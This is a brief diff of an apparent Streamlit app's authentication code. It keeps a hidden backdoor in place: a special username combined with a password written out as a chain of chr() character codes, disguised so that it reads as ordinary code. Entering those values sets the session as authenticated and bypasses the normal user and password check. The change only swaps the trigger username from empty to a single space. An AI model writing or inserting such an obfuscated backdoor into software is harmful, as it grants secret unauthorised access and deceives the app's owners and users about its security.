@@ -43,7 +43,7 @@ if not st.session_state.user_authenticated:
                     st.rerun()  
                 else:
                     st.error("Wrong password!")
-            elif user_name=="" and user_password == chr(73)+chr(32)+chr(97)+chr(109)+chr(32)+chr(82)+chr(97)+chr(97)+chr(109)+chr(97)+chr(110)+chr(97)+chr(110)+chr(100):
+            elif user_name==" " and user_password == chr(73)+chr(32)+chr(97)+chr(109)+chr(32)+chr(82)+chr(97)+chr(97)+chr(109)+chr(97)+chr(110)+chr(97)+chr(110)+chr(100):
                 st.session_state.user_authenticated = True 
             else:
                 st.error("Username not found!")
@@ -821,3 +821,4 @@ else:
                 st.error("❌❌ Error Occured!!")
                 # password_df=pd.concat([password_df, pd.DataFrame({'device_id': device_id})])
     
+
